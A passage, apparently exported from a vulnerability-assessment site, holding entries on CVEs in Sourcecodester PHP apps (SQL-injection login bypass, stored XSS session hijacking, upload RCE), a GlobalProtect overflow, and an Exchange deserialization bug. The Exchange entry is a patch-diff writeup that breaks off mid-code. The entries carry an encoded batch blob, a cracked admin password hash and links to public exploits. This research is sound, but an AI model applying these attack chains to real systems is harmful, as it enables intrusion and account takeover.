`r0n1n.bat`\r\n\r\n```bat\r\nXvL5vVDYAJj4HVMbIvtHb6RMoVRD9iM5nNOr2XqhOpGam2eUj8ytNzzaJyLI+Pv0MtFALO1RllnynHT6Odr38k3iyKIyTN+FszTfPrdRuHJlBKLn79q7ClWCQwWKYtTOXSPGgaKHIyxQz6RR+8JV9FQMmUjHtus7ENGSGsbL8RJIHfCVRqH6xb8tpXPJILc4gIn7mseYxiLp8x7s5Q4QhGXnHvhrsj7lE6jqTQmphumt3gQmBvxlhQILxBKGSG5ZxoVleq4xR/aUiivIiejShajuYChPXHzDF3g/e41aX4BpHa3iQsf390FP+m+FKrpeNPSZUcQAy48EwgEdHNz04yblTBo5sS5ywV5ej+3ZmiwVALH6MSvnLG3mTqglNXSc4+/MkxxmuPrn0Xbe5EZnuGjZTAnWFqfzQJjwy3A8gI2AQWH+RAR2CdWCRzr6hB0rFYJlPrFOKWAgpPB92HfUsQ==\r\n```\r\n\r\n## Decrypt of the password\r\nThe password is based on PHP md5() function. So, MD5 reverse for 0192023a7bbd73250516f069df18b500 is admin123\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/edit/main/vendors/oretnom23/CVE-nu11-20-100121)\r\n\r\n## Proof:\r\n[href](https://streamable.com/ucewhd)\r\n\r\n- Music: - UKF\r\n\r\n## BR @nu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "8fc2e5c1-8e78-4d7f-b797-efc2c8df4724",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "1e0d6805-9d0f-4960-9dab-83483412f525",
      "created": "2021-11-20T08:47:22.876584Z",
      "revisionDate": "2023-05-17T08:04:04.985807Z",
      "document": "## [CVE-2021-43141](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43141)\r\n\r\n## [Vendor](https://www.sourcecodester.com/php/15013/simple-subscription-website-admin-panel-php-and-sqlite-source-code.html)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-43141/docs/Screenshot%202021-11-20%20101938-wall.png)\r\n\r\n## Description:\r\n\r\nCross-Site Scripting (XSS) vulnerability exists in Sourcecodester Simple Subscription Website 1.0 via the id parameter in plan_application and users_application.\r\nThe attacker can use SQL - Injection bypass Authentication method to log in to the admin account of the system and then he can exploit this account by using XSS-Stored to attack and exploit the account, and then he can use remote requests to hijack PHPSESSID and can exploit this account and users into it by using an XSS-Stored method!\r\nConclusion: The status of this system is CRITICAL and awful, and this must be stopped immediately for distribution! \r\n\r\n## Action:\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-43141/docs/Screenshot%202021-11-20%20101900.png)\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-43141)\r\n\r\n## Proof and exploit:\r\n[href](https://www.nu11secur1ty.com/2021/11/cve-2021-43141.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "25fe6aca-c546-4a3d-982b-4e56167e239e",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "b22fd37e-5765-4d5d-b431-92c272e90ca5",
      "created": "2021-11-20T17:07:16.280481Z",
      "revisionDate": "2023-05-17T08:02:57.823219Z",
      "document": "## [CVE-2021-42671](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42671)\r\n\r\n## [Vendor](https://www.sourcecodester.com/php/13115/engineers-online-portal-php.html)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-42671/docs/Screenshot%202021-11-20%20185001.png)\r\n\r\n## Description:\r\nAn RCE vulnerability exists in Engineers Online Portal 1.0 when the malicious user creates an account with a malicious purpose.\r\nWhen the user is already with the account he can upload a malicious RCE exploit without any problem - no sanitizing.\r\nAfter uploading this RCE malicious file, he can navigate by using the directory traversal method, which is another problem of this system, then he can execute the malicious code. Conclusion: Status awful and critical.\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-42671)\r\n\r\n## Proof and exploit:\r\n[href](https://www.nu11secur1ty.com/2021/11/cve-2021-42671.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Discovery",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "ceee9581-5dfc-4c0e-b7ab-2b8b30e524ce",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "61eda782-bab2-4f6d-a0be-61b22f1c8701",
      "created": "2021-11-21T10:22:12.865527Z",
      "revisionDate": "2023-05-17T08:02:09.589856Z",
      "document": "## [CVE-2021-41675](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41675)\r\n\r\n## [Vendor](https://www.sourcecodester.com/php/12684/young-entrepreneur-e-negosyo-system.html)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-41675/docs/Screenshot%202021-11-21%20104148-info.png)\r\n\r\n## Author and redevelopment of the PoC\r\n\r\n- `nu11secur1ty`\r\n\r\n## First cool ;) Idea: \r\n\r\n- Thank you, dear friend!\r\n- `Janik Wehrli`\r\n\r\n## Description:\r\n\r\nA Remote Code Execution (RCE) vulnerability exists in Sourcecodester E-Negosyo System 1.0 in /admin/produts/controller.php via the do Insert function, which validates images with getImageSizei... More about the function: https://www.php.net/manual/en/function.getimagesize.php The attacker can deploy malicious RCE files bypassing this function, and after that, he can use the directory traversal method, to navigate to the `/uploaded_photos/ ` directory which is another and actual problem of this system. After the problem, which is - no sanitizing of the function \"(getimagesize())\" on this system, the attacker can execute the malicious RCE code, and then he can retrieve all sensitive information about the App on this server, and all architecture of this server. CONCLUSION: There is no proper disinfection of \"(getimagesize())\" function, and correctly protecting the directory ` /uploaded_photos/.`\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-41675)\r\n\r\n## Proof and exploit:\r\n[href](https://www.nu11secur1ty.com/2021/11/cve-2021-41675.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Discovery",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "4bd7434e-1295-411a-be1e-0ff5f83a8d6a",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "9ea0c957-2b1a-4f13-8ba5-b2e5ff0f3581",
      "created": "2021-11-21T17:23:35.109766Z",
      "revisionDate": "2022-07-06T09:00:39.893886Z",
      "document": "Interesting bug in that this is a high value exploit against Palo Alto Network's GlobalProtect VPN, which allows unauthenticated attackers to gain `root` level code execution on target systems. That being said, attackers must have access to the GlobalProtect interface to exploit this issue. However this is just if we consider this bug on its own. They also mention that researchers at Randori managed to find a way to combine this bug with a HTTP Smuggling attack to turn this into a fully working RCE exploit. For this reason I've rated this as a 4/5 on value: it does require some additional bugs but its super useful: going from no access on the network to full `root` level access on a VPN controller is a dream come true for a lot of attackers, particularly when exploitation is meant to be pretty easy.\r\n\r\nThe technical details mention that this is a classic stack based buffer overflow into a fixed size stack buffer, and that whilst ASLR is present on non-virtualized devices that does make exploitation a bit harder, most virtualized devices do not have ASLR enabled, making exploitation significantly easier. They also mention that they did not yet exploit MIPS based systems due to their big-endian architecture, and although this is likely due more to unfamiliarity than technical complexity, it is something to consider.\r\n\r\nI can see this being particularly useful on internal engagements given the supposed relative ease of exploitation, and also by APTs. Widespread exploitation may occur if one can figure out the HTTP Smuggling attack mentioned; once that gets figured out publicly I imagine this will be a ripe target for exploitation given its relative easy and extremely high value.\r\n\r\nMore details will supposedly be given out by Randori on December 14th, although it is worth noting this bug was patched quite a while ago. See the Twitter thread at https://twitter.com/GossiTheDog/status/1459189710945980416 and https://twitter.com/_MG_/status/1459024603263557633 where it was noted that the fixed version was released way back in September 2020 with PanOS 8.1.17. Unfortunately it is a bit hard to note some of this and there has been some confusion due to the release notes not containing full information, and only later being updated to note that this issue was patched within them.",
      "score": 0,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "9dd990db-d469-4708-a1c5-24d06043b5cb",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "ea6ad256-9b4e-4dc6-b230-9aded3ee40c0",
      "created": "2021-11-21T17:55:13.884824Z",
      "revisionDate": "2022-07-10T07:13:33.981743Z",
      "document": "A PoC for this vulnerability is now available at https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398. There is also a Metasploit module at https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/windows/http/exchange_chainedserializationbinder_denylist_typo_rce.rb\r\n\r\nWhat follows is my writeup for this that I wrote a while back, containing info on finding the bug from the patches as well as some info on the side effects of exploiting this bug.\r\n\r\n# Intro\r\nAlright so looks like this bug, CVE-2021-42321 is a post authentication RCE bug.\r\n\r\nOnly affects Exchange 2016 CU 21 and CU 22. Also Exchange 2019 CU 10 and CU 11.\r\n\r\nFound bug fix by patch diffing the October 2021 security updates and the November 2021 patches. Aka https://support.microsoft.com/help/5007409 which applies the November 2021 patch, and KB5007012 aka the October 2021 patch.\r\n\r\nPersonally I found that we can use [[7Zip]] to uncompress the MSI files from the patches, then use [[dnSpy]] from https://github.com/dnSpy/dnSpy to load all files in the directory we extract the patch contents to a folder. Note that [[ILSpy]] is a nice alternative however unfortunately it does run into issues with decompiling files that [[dnSpy]] can handle fine, so you end up missing lots of files from the export.\r\n\r\nOnce decompilation is done use `File->Remove assemblies with load errors` to remove the extra files that couldn't be decompiled, then use `File -> Save Code` after selecting every single file in the code and it should show us the opportunity to create a new project to save the code to.  \r\n\r\nFrom here we can create a new directory to save the code into and tell it to save the decompiled code into that.\r\n\r\nFrom there we can use [[Meld]] to do a directory diff of the files from the two patch files to see what changed.\r\n\r\n# Analyzing the Diff\r\n## Finding the Changed Files\r\nLooking at just the new/removed files we can see the following:\r\n\r\n![[Pasted image 20220205113200.png]]\r\n\r\nAs we can see here of particular note given this is a serialization bug is the fact that `Microsoft.Exchange.Compliance.dll` had three files removed from it, specifically under the `Microsoft.Exchange.Compliance\\Compliance\\Serialiation\\Formatters` directory for the following files:\r\n- TypedBinaryFormatter.cs\r\n- TypedSerialiationFormatter.cs\r\n- TypedSoapFormatter.cs\r\n\r\n\r\n## Narrowing in on The Vulnerable File - TypedBinaryFormatter.cs\r\n\r\nLooking through these files we can see that `TypedBinaryFormatter.cs` has a function named `Deserialize` with the following prototype:\r\n\r\n```cs\r\n// Microsoft.Exchange.Compliance.Serialization.Formatters.TypedBinaryFormatter  \r\nusing System.IO;  \r\nusing System.Runtime.Serialization;  \r\nusing Microsoft.Exchange.Diagnostics;  \r\n  \r\nprivate static object Deserialize(Stream serializationStream, SerializationBinder binder)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0return ExchangeBinaryFormatterFactory.CreateBinaryFormatter(DeserializeLocation.ComplianceFormatter, strictMode: false, allowedTypes, allowedGenerics).Deserialize(serializationStream);  \r\n}\r\n```\r\n\r\nWhat is interesting here is that `binder` is a `SerializationBinder`, which is a essentially a class that acts as a controller to tell the program what can be and can't be serialized and deserialized. Yet this is never passed into the `ExchangeBinaryFormatterFactory.CreateBinaryFormatter()` function, so it never gets this crucial information on what it is meant to be blocking as far as deserialization goes.\r\n\r\n## Examining Deserialize() Function Call to CallExchangeBinaryFormatterFactory.CreateBinaryFormatter()\r\nLets see where `ExchangeBinaryFormatterFactory.CreateBinaryFormatter` is defined. Looking for the string `ExchangeBinaryFormatter` in [[dnSpy]] will bring us to `Microsoft.Exchange.Diagnostics.dll` under the `Microsoft.Exchange.Diagnostics` namespace, then the `ExchangeBinaryFormatterFactory` we can see the definition for `ExchangeBinaryFormatterFactory.CreateBinaryFormatter()` as:\r\n\r\n```cs\r\n// Microsoft.Exchange.Diagnostics.ExchangeBinaryFormatterFactory  \r\nusing System.Runtime.Serialization.Formatters.Binary;  \r\n  \r\npublic static BinaryFormatter CreateBinaryFormatter(DeserializeLocation usageLocation, bool strictMode = false, string[] allowList = null, string[] allowedGenerics = null)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0return new BinaryFormatter  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Binder = new ChainedSerializationBinder(usageLocation, strictMode, allowList, allowedGenerics)  \r\n\u00a0\u00a0\u00a0\u00a0};  \r\n}\r\n```\r\n\r\nNote also that in the original call `strictMode` was set to `false` and the `allowList` and `allowedGenerics` were set to `TypedBinaryFormatter.allowedTypes`, and `TypedBinaryFormatter.allowedGenerics` respectively. Meanwhile `useageLocation` was set to `DeserializeLocation.ComplianceFormatter`.\r\n\r\nThis will mean that we end up calling `ChainedSerializationBinder` with:\r\n- `strictMode` set to `false`, \r\n- `allowList` set to `TypedBinaryFormatter.allowedTypes`\r\n- `allowedGenerics` set to `TypedBinaryFormatter.allowedGenerics`\r\n- `usageLocation` set to `DeserializeLocation.ComplianceFormatter`.\r\n\r\n## Examining ChainedSerializationBinder Class Deeper\r\nIf we look at the code we can see that a new `ChainedSerializationBinder` instance is being created so lets take a look at that.\r\n\r\nWe can see the definition of the initialization function here:\r\n\r\n```cs\r\n// Microsoft.Exchange.Diagnostics.ChainedSerializationBinder  \r\nusing System;  \r\nusing System.Collections.Generic;  \r\n  \r\npublic ChainedSerializationBinder(DeserializeLocation usageLocation, bool strictMode = false, string[] allowList = null, string[] allowedGenerics = null)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0this.strictMode = strictMode;  \r\n\u00a0\u00a0\u00a0\u00a0allowedTypesForDeserialization = ((allowList != null && allowList.Length != 0) ? new HashSet<string>(allowList) : null);  \r\n\u00a0\u00a0\u00a0\u00a0allowedGenericsForDeserialization = ((allowedGenerics != null && allowedGenerics.Length != 0) ? new HashSet<string>(allowedGenerics) : null);  \r\n\u00a0\u00a0\u00a0\u00a0typeResolver = typeResolver ?? ((Func<string, Type>)((string s) => Type.GetType(s)));  \r\n\u00a0\u00a0\u00a0\u00a0location = usageLocation;  \r\n}\r\n```\r\n\r\nHere we can see that `allowedTypesForDeserialization` is set to `TypedBinaryFormatter.allowedTypes` and `allowedGenericsForDeserialization` is set to `TypedBinaryFormatter.allowedGenerics`. Furthermore, `this.strictMode` is set to `false`, and `location` is set to `DeserializeLocation.ComplianceFormatter`.\r\n\r\nNext we should know that `BindToType()` is used to validate the class for deserialization. So lets take a look at that logic inside the `ChainedSerializationBinder` class.\r\n\r\n```cs\r\n// Microsoft.Exchange.Diagnostics.ChainedSerializationBinder  \r\nusing System;  \r\n  \r\npublic override Type BindToType(string assemblyName, string typeName)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0if (serializationOnly)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0throw new InvalidOperationException(\"ChainedSerializationBinder was created for serialization only.\u00a0\u00a0This instance cannot be used for deserialization.\");  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0Type type = InternalBindToType(assemblyName, typeName);  \r\n\u00a0\u00a0\u00a0\u00a0if (type != null)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ValidateTypeToDeserialize(type);  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0return type;  \r\n}\r\n```\r\n\r\nSince `serializationOnly` isn't set, we will skip this logic and get the type using `InternalBindToType()` which is a simple wrapper around `LoadType()` with no validation:\r\n\r\n```cs\r\n// Microsoft.Exchange.Diagnostics.ChainedSerializationBinder  \r\nusing System;  \r\n  \r\nprotected virtual Type InternalBindToType(string assemblyName, string typeName)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0return LoadType(assemblyName, typeName);  \r\n}\r\n```\r\n\r\nAfter getting the type we then check the type wasn't `null`, aka we were able to find a valid type, and we call `ValidateTypeToDeserialize(type)` to validate that the type is okay to deserialize.\r\n\r\n```cs\r\n// Microsoft.Exchange.Diagnostics.ChainedSerializationBinder  \r\nusing System;  \r\n  \r\nprotected void ValidateTypeToDeserialize(Type typeToDeserialize)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0if (typeToDeserialize == null)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return;  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0string fullName = typeToDeserialize.FullName;  \r\n\u00a0\u00a0\u00a0\u00a0bool flag = strictMode;  \r\n\u00a0\u00a0\u00a0\u00a0try  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (!strictMode && (allowedTypesForDeserialization == null || !allowedTypesForDeserialization.Contains(fullName)) && GlobalDisallowedTypesForDeserialization.Contains(fullName))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0flag = true;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0throw new InvalidOperationException($\"Type {fullName} failed deserialization (BlockList).\");  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (typeToDeserialize.IsConstructedGenericType)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fullName = typeToDeserialize.GetGenericTypeDefinition().FullName;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (allowedGenericsForDeserialization == null || !allowedGenericsForDeserialization.Contains(fullName) || GlobalDisallowedGenericsForDeserialization.Contains(fullName))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0throw new BlockedDeserializeTypeException(fullName, BlockedDeserializeTypeException.BlockReason.NotInAllow, location);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (!AlwaysAllowedPrimitives.Contains(fullName) && (allowedTypesForDeserialization == null || !allowedTypesForDeserialization.Contains(fullName) || GlobalDisallowedTypesForDeserialization.Contains(fullName)) && !typeToDeserialize.IsArray && !typeToDeserialize.IsEnum && !typeToDeserialize.IsAbstract && !typeToDeserialize.IsInterface)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0throw new BlockedDeserializeTypeException(fullName, BlockedDeserializeTypeException.BlockReason.NotInAllow, location);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0catch (BlockedDeserializeTypeException ex)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0DeserializationTypeLogger.Singleton.Log(ex.TypeName, ex.Reason, location, (flag || strictMode) ? DeserializationTypeLogger.BlockStatus.TrulyBlocked : DeserializationTypeLogger.BlockStatus.WouldBeBlocked);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (flag)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0throw;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n}\r\n```\r\n\r\nHere is where the code gets interesting. You see, there is only one catch statement, which is designed to catch all `BlockedDeserializationTypeException` errors, however `if (!strictMode && (allowedTypesForDeserialization == null || !allowedTypesForDeserialization.Contains(fullName)) && GlobalDisallowedTypesForDeserialization.Contains(fullName))` will result in an unhandled `InvalidOperationException` being thrown if both `strictMode` isn't set and the type we are trying to deserialize is within the `GlobalDisallowedTypesForDeserialization` and has not been granted exception via the `allowedTypesForDeserialization` list. Since `strictMode` is not set, there is the very real possibility this exception might be thrown, so this is something we have to watch out for.\r\n\r\nOtherwise every other exception thrown will be caught by this `catch (BlockedDeserializeTypeException ex)` code, however it will interestingly log the exception as a `DeserializationTypeLogger.BlockStatus.WouldBeBlocked` error since `strictMode` is set to false as is `flag` which is set as `bool flag = strictMode;` earlier in the code.\r\n\r\nAdditionally since `flag` isn't set since `strictMode` is set to `false`, no error is thrown and the code proceeds normally without any errors.\r\n\r\nHowever what is in this blacklist denoted by `GlobalDisallowedTypesForDeserialization`? Lets find out. First we need to find out how `GlobalDisallowedTypesForDeserialization` is defined.\r\n\r\n## Looking Deeper at GlobalDisallowedTypesForDeserialization Type Blacklist - Aka Finding the Bug\r\n\r\nLooking at the code for `Microsoft.Exchange.Diagnostics.ChainedSerializationBinder` we can see that `GlobalDisallowedTypesForDeserialization` is actually set to the result of `BuildDisallowedTypesForDeserialization()` when it is initialized:\r\n\r\n```cs\r\n// Microsoft.Exchange.Diagnostics.ChainedSerializationBinder  \r\nusing System;  \r\nusing System.Collections.Generic;  \r\nusing System.IO;  \r\nusing System.Linq;  \r\nusing System.Reflection;  \r\nusing System.Runtime.Serialization;  \r\nusing Microsoft.Exchange.Diagnostics;  \r\n  \r\npublic class ChainedSerializationBinder : SerializationBinder  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0private const string TypeFormat = \"{0}, {1}\";  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private static readonly HashSet<string> AlwaysAllowedPrimitives = new HashSet<string>  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(string).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(int).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(uint).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(long).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(ulong).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(double).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(float).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(bool).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(short).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(ushort).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(byte).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(char).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(DateTime).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(TimeSpan).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(Guid).FullName  \r\n\u00a0\u00a0\u00a0\u00a0};  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private bool strictMode;  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private DeserializeLocation location;  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private Func<string, Type> typeResolver;  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private HashSet<string> allowedTypesForDeserialization;  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private HashSet<string> allowedGenericsForDeserialization;  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private bool serializationOnly;  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0protected static HashSet<string> GlobalDisallowedTypesForDeserialization { get; private set; } = BuildDisallowedTypesForDeserialization();\r\n```\r\n\r\nIf we decompile this function we can notice something interesting:\r\n\r\n```cs\r\n// Microsoft.Exchange.Diagnostics.ChainedSerializationBinder  \r\nusing 